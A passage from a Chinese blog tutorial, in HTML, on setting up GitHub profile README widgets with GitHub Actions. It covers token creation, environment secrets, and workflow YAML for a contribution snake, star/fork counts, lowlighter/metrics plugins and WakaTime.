src="https://www.freeimg.cn/i/2024/01/13/65a2523fd5dd3.png" style="width:800px;"/></div></div></li><li>新建Token<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a25240cb6b6.png" style="width:800px;"/></div></div></li><li>选择参数后点击下面的创建，<strong>然后会生成一串字符，就是你的Token，只会出现一次，建议暂时不要关闭这个页面</strong><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a25240cd411.png" style="width:800px;"/></div></div>注意上图的第三步建议前三个都勾选，如果不清楚含义，可以全部勾选</li></ul>              </div>            </details><details class="folding-tag" yellow><summary> 将Token添加到Environment secrets </summary>              <div class='content'>              <ul><li>进入仓库的<code>Setting</code><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab88b30456b.png"/></div></div></li><li>打开<code>Action</code><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab890150fee.png"/></div></div></li><li>把刚才生成的<code>Token</code>添加到<code>Environment secrets</code>，注意<code>Secret</code>的名字要和上面的yml文件中的<code>name</code>一致，为<code>GH_TOKEN</code>，否则会报错。<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab89a17a5d2.png"/></div></div></li></ul>              </div>            </details><ol start="3"><li>创建完提交代码到仓库，并尝试运行，看看是否配置成功。如果报错了，多半是因为<code>Secret</code>没有配置正确，检查一下。<strong>也可以在评论区交流。</strong><br>可能遇到的问题：</li></ol><ul><li>设置的<code>Environment secrets</code>的<code>name</code>与yml文件中的<code>environment name</code>不一致，重新设置一下，最后的样子就是下面框框内<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab89a17a5d2.png"/></div></div></li><li>运行成功以后可能git提交会报错，是因为Action生成了新的svg文件，导致远程仓库与本地内容不一致，使用下面代码应该可以解决<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;update&quot;</span></span><br><span class="line">git fetch</span><br><span class="line">git merge origin FETCH_HEAD</span><br><span class="line">git push</span><br></pre></td></tr></table></figure></li><li><strong>权限问题：</strong>本篇博客中的部分GitHub Actions需要修改（读+写）权限<br>解决方法：点击仓库的<code>setting</code>–&gt;<code>Actions</code>–&gt;<code>General</code>–&gt;勾选<code>Read and write permissions</code>–&gt;<code>Save</code><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/22/65ad4e82dfff2.png"/></div></div></li></ul><ol start="4"><li>在<code>README.md</code>文件中引用，这里只是一个例子，大家举一反三玩出新花样。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;github-snake&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/JJLibra/JJLibra/profile-snake-contrib/github-contribution-grid-snake-dark.svg&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="Fork-Star"><a href="#Fork-Star" class="headerlink" title="Fork&amp;Star"></a>Fork&amp;Star</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab7be633b5f.png"/></div></div><p>在仓库介绍显示fork数和star数</p><ol><li>在项目根目录下创建<code>/.github/workflows/fork&amp;star.yml</code>文件，将以下代码复制到该文件中：<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Update</span> <span class="string">Fork</span> <span class="string">Star</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">fork:</span></span><br><span class="line">  <span class="attr">watch:</span></span><br><span class="line">    <span class="attr">types:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">started</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&#x27;0 0 * * *&#x27;</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">update:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">environment:</span> </span><br><span class="line">        <span class="attr">name:</span> <span class="string">ACCESS_TOKEN</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">This</span> <span class="string">repo</span> <span class="string">has</span> <span class="string">x</span> <span class="string">stars</span> <span class="string">y</span> <span class="string">forks</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">ouuan/This-repo-has-x-stars-y-forks-action@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.ACCESS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">template:</span> <span class="string">&quot;Xxfer&#x27;s profile with &lt;starCount&gt; stars and &lt;forkCount&gt; forks 🎉&quot;</span></span><br></pre></td></tr></table></figure></li><li>按照上文的方法再生成一个新的Token</li><li>按上文步骤在仓库的Setting-&gt;Secrets-&gt;Actions-&gt;Environment secrets中添加<code>ACCESS_TOKEN</code><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab91b97e2aa.png"/></div></div></li><li>创建完提交代码到仓库，并尝试运行，看看是否配置成功。</li><li>这个不显示在<code>README.md</code>文件中，不需要引用。</li></ol><h3 id="Metrics"><a href="#Metrics" class="headerlink" title="Metrics"></a>Metrics</h3><p>生成的东西有点多，建议看我的源码<code>github-metrics</code>文件夹，里面有很多的svg文件。<br>在 GitHub首页展示比较具体的使用信息 –&gt; <a href="https://github.com/lowlighter/metrics">源码传送门</a><br><a href="https://metrics.lecoq.io/">Demo site</a></p><p><strong>原理：利用GitHub Actions定时更新仓库中对应的svg，README文件中引用的svg也会跟着变化。</strong></p><ol><li>在项目根目录下创建<code>/.github/workflows/metrics.yml</code>文件，将以下代码复制到该文件中：<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Metrics</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">schedule:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&quot;0 0 * * *&quot;</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line">  <span class="comment"># push: &#123;branches: [&quot;master&quot;, &quot;main&quot;]&#125;</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">github-metrics:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">environment:</span> </span><br><span class="line">      <span class="attr">name:</span> <span class="string">METRICS_TOKEN</span></span><br><span class="line">    <span class="attr">permissions:</span></span><br><span class="line">      <span class="attr">contents:</span> <span class="string">write</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="comment"># 基础信息（顺带了几个小插件）</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">base</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/base.svg</span></span><br><span class="line">          <span class="comment"># Your GitHub token</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="comment"># Options</span></span><br><span class="line">          <span class="attr">user:</span> <span class="string">JJLibra</span></span><br><span class="line">          <span class="attr">template:</span> <span class="string">classic</span></span><br><span class="line">          <span class="attr">config_timezone:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;header, activity, community, repositories&quot;</span></span><br><span class="line">          <span class="comment"># 此插件为文档中的 🧮 Repositories traffic</span></span><br><span class="line">          <span class="attr">plugin_traffic:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="comment"># 此插件为文档中的 👨‍💻 Lines of code changed</span></span><br><span class="line">          <span class="attr">plugin_lines:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="comment"># 此插件为文档中的 🙋 Introduction</span></span><br><span class="line">          <span class="attr">plugin_introduction:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="comment"># 此插件为文档中的 🎫 Gists</span></span><br><span class="line">          <span class="attr">plugin_gists:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="comment"># 此插件为文档中的 💫 Star lists</span></span><br><span class="line">          <span class="attr">plugin_starlists:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_starlists_limit_repositories:</span> <span class="number">2</span></span><br><span class="line">          <span class="attr">plugin_starlists_languages:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_starlists_limit_languages:</span> <span class="number">8</span></span><br><span class="line">          <span class="attr">plugin_starlists_only:</span> <span class="string">Awesome</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 📅 Isometric commit calendar</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Full-year</span> <span class="string">calendar</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/isocalendar.fullyear.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="comment"># 不添加基础信息</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="comment"># 使用此插件</span></span><br><span class="line">          <span class="attr">plugin_isocalendar:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="comment"># 设置成显示整年</span></span><br><span class="line">          <span class="attr">plugin_isocalendar_duration:</span> <span class="string">full-year</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 🈷️ Languages activity</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Indepth</span> <span class="string">analysis</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/languages.indepth.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_languages:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_languages_ignored:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">            html, css, tex, less, dockerfile, makefile, qmake, lex, cmake, shell,</span></span><br><span class="line"><span class="string">            gnuplot</span></span><br><span class="line"><span class="string"></span>          <span class="attr">plugin_languages_indepth:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_languages_details:</span> <span class="string">lines,</span> <span class="string">bytes-size</span></span><br><span class="line">          <span class="attr">plugin_languages_limit:</span> <span class="number">4</span></span><br><span class="line">          <span class="attr">plugin_languages_analysis_timeout:</span> <span class="number">15</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># ✨ Stargazers   </span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Using</span> <span class="string">chartist</span> <span class="string">charts</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/stargazers.chartist.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_stargazers:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_stargazers_charts_type:</span> <span class="string">chartist</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 🌟 Recently starred repositories</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Recently</span> <span class="string">starred</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/stars.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_stars:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_stars_limit:</span> <span class="number">10</span></span><br><span class="line">          </span><br><span class="line">      <span class="comment"># 💡 Coding habits and activity</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Recent</span> <span class="string">activity</span> <span class="string">charts</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/habits.charts.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_habits:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_habits_facts:</span> <span class="literal">no</span></span><br><span class="line">          <span class="attr">plugin_habits_charts:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">config_timezone:</span> <span class="string">Europe/Paris</span></span><br><span class="line">          </span><br><span class="line">      <span class="comment"># 🎟️ Follow-up of issues and pull requests </span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Indepth</span> <span class="string">analysis</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/followup.indepth.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_followup:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_followup_indepth:</span> <span class="literal">yes</span></span><br><span class="line">          </span><br><span class="line">      <span class="comment"># 🎭 Comment reactions</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Comment</span> <span class="string">reactions</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/reactions.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_reactions:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_reactions_limit:</span> <span class="number">100</span></span><br><span class="line">          <span class="attr">plugin_reactions_details:</span> <span class="string">percentage</span></span><br><span class="line">          </span><br><span class="line">      <span class="comment"># 📓 Featured repositories</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Pinned</span> <span class="string">repositories</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/repositories.pinned.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_repositories:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_repositories_pinned:</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 💬 Discussions</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">GitHub</span> <span class="string">Discussions</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/discussions.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_discussions:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_discussions_categories_limit:</span> <span class="number">8</span>       </span><br><span class="line">  </span><br><span class="line">      <span class="comment"># 📆 Commit calendar</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Full</span> <span class="string">history</span> <span class="string">calendar</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/calendar.full.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_calendar:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_calendar_limit:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 🏆 Achievements</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Compact</span> <span class="string">display</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/achievements.compact.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_achievements:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_achievements_only:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">            polyglot, stargazer, sponsor, deployer, member, maintainer, developer,</span></span><br><span class="line"><span class="string">            scripter, packager, explorer, infographile, manager</span></span><br><span class="line"><span class="string"></span>          <span class="attr">plugin_achievements_display:</span> <span class="string">compact</span></span><br><span class="line">          <span class="attr">plugin_achievements_threshold:</span> <span class="string">X</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># 📰 Recent activity</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Recent</span> <span class="string">activity</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/activity.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.METRICS_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_activity:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_activity_limit:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">plugin_activity_days:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">plugin_activity_filter:</span> <span class="string">issue,</span> <span class="string">pr,</span> <span class="string">release,</span> <span class="string">fork,</span> <span class="string">review,</span> <span class="string">ref/create</span></span><br><span class="line">  </span><br><span class="line">      <span class="comment"># 🗨️ Stack Overflow</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Top</span> <span class="string">answers</span> <span class="string">from</span> <span class="string">stackoverflow</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">lowlighter/metrics@latest</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">filename:</span> <span class="string">github-metrics/stackoverflow.svg</span></span><br><span class="line">          <span class="attr">token:</span> <span class="string">NOT_NEEDED</span></span><br><span class="line">          <span class="attr">base:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">          <span class="attr">plugin_stackoverflow:</span> <span class="literal">yes</span></span><br><span class="line">          <span class="attr">plugin_stackoverflow_user:</span> <span class="number">1</span></span><br><span class="line">          <span class="attr">plugin_stackoverflow_sections:</span> <span class="string">answers-top</span></span><br><span class="line">          <span class="attr">plugin_stackoverflow_limit:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></li><li>按照上文的方法再生成一个新的Token</li><li>按上文步骤在仓库的Setting-&gt;Secrets-&gt;Actions-&gt;Environment secrets中添加<code>METRICS_TOKEN</code><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab93c44e8fc.png"/></div></div></li><li>创建完提交代码到仓库，并尝试运行，看看是否配置成功。</li><li>在<code>README.md</code>文件引用<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/JJLibra/JJLibra/github-metrics/base.svg&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="Wakatime"><a href="#Wakatime" class="headerlink" title="Wakatime"></a>Wakatime</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab80495370f.png"/></div></div><p>在GitHub首页展示日常编程情况 –&gt; <a href="https://wakatime.com/dashboard">官网传送门</a><br>先在官网注册账号，进入wakatime官网的<code>Setting</code>，里面的<code>Secret API Key</code>一会儿会用到。</p><ol><li>在项目根目录下创建<code>/.github/workflows/waka.yml</code>文件，将以下代码复制到该文件中：<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Waka</span> <span class="string">Readme</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&#x27;30 18 * * *&#x27;</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">update-readme:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Update</span> <span class="string">Readme</span> <span class="string">with</span> <span class="string">Metrics</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">environment:</span> </span><br><span class="line">      <span class="attr">name:</span> <span class="string">GH_TOKEN</span></span><br><span class="line">    <span class="attr">permissions:</span></span><br><span class="line">      <span class="attr">contents:</span> <span class="string">write</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span 